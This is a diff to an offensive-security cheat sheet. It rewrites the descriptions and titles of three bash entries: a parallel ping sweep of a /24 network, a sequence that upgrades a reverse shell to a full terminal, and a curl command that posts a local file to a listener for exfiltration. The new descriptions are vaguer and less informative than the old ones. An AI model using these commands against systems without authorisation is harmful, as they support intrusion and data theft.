@@ -4,9 +4,9 @@
 
 ### Ping sweep
 
-Sweep a /24 with one ping each in parallel and print only successful replies. Quick host discovery without nmap, useful when scanning is restricted.
+Run ping sweep with Bash.
 
-```sh title:"Parallel /24 ping sweep, print only live replies"
+```sh title:"Bash Run Ping Sweep"
 for i in {1..254} ;do (ping -c 1 $first_three_octets.$i | grep "bytes from" &) ;done
 ```
 <!-- cheat
@@ -15,9 +15,9 @@ var first_three_octets = printf '%s\n' '192.168.1' '10.10.10' '172.16.0' --- --h
 
 ### Stabilize shell
 
-Upgrade a dumb reverse shell to a full PTY using script(1), then background and fix terminal modes so tab completion, ctrl-c, and resizing work.
+Start stabilize shell with Bash.
 
-```sh title:"Upgrade reverse shell to full PTY via script(1)"
+```sh title:"Bash Start Stabilize Shell"
 /usr/bin/script -qc /bin/bash /dev/null
 \# ^Z
 \# stty raw -echo; fg; reset
@@ -26,9 +26,9 @@ Upgrade a dumb reverse shell to a full PTY using script(1), then background and 
 
 ### Curl file upload
 
-POST a local file to a listener with multipart/form-data. Pair with a simple HTTP receiver to exfil one file at a time.
+Upload curl file upload with Bash.
 
-```sh title:"Multipart POST a file to listener for exfil"
+```sh title:"Bash Upload Curl File Upload"
 curl -F 'file=@$file_to_upload' $lhost
 ```
 <!-- cheat
